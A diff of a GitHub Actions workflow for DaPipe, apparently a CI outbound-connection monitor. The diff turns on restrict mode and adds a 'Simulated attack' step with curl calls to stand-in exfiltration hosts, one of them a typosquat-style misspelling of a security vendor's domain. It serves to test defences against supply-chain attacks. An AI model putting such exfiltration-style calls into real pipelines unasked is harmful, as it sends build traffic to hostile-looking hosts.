@@ -12,64 +12,32 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # DaPipe Setup - monitor outbound connections
       - name: DaPipe Setup
         uses: yevgeniyo-ps/dapipe@main
         with:
           step: setup
-          mode: monitor
+          mode: restrict
           baseline-path: .dapipe/baseline.json
           api-key: ${{ secrets.DAPIPE_API_KEY }}
-          api-url: https://app.dapipe.io
 
-      # Normal CI steps
       - uses: actions/setup-node@v4
         with:
           node-version: 20
 
-      - run: echo "Running customer build..."
       - run: npm init -y && npm install lodash express
       - run: echo "Build complete!"
 
-      # DaPipe Analyze - report connections
+      # Simulate a supply-chain attack — these should be blocked
+      - name: Simulated attack
+        run: |
+          curl -sf --max-time 3 https://evil-c2-server.example.com/exfil 2>/dev/null || true
+          curl -sf --max-time 3 https://scan.aquasecurtiy.org/steal 2>/dev/null || true
+
       - name: DaPipe Analyze
         if: always()
         uses: yevgeniyo-ps/dapipe@main
         with:
           step: analyze
-          mode: monitor
-          baseline-path: .dapipe/baseline.json
-          api-key: ${{ secrets.DAPIPE_API_KEY }}
-          api-url: https://app.dapipe.io
-
-  # Test: simulate supply-chain attack
-  attack-demo:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: DaPipe Setup (restrict mode)
-        uses: yevgeniyo-ps/dapipe@main
-        with:
-          step: setup
           mode: restrict
           baseline-path: .dapipe/baseline.json
           api-key: ${{ secrets.DAPIPE_API_KEY }}
-          api-url: https://app.dapipe.io
-
-      - name: Simulated attack
-        run: |
-          echo "Simulating compromised dependency..."
-          curl -sf --max-time 3 https://evil-c2-server.example.com/exfil 2>/dev/null || true
-          curl -sf --max-time 3 https://attacker-domain.evil.io/steal 2>/dev/null || true
-          echo "Attack simulation complete."
-
-      - name: DaPipe Analyze (expect blocks)
-        if: always()
-        uses: yevgeniyo-ps/dapipe@main
-        with:
-          step: analyze
-          mode: restrict
-          baseline-path: .dapipe/baseline.json
-          api-key: ${{ secrets.DAPIPE_API_KEY }}
-          api-url: https://app.dapipe.io
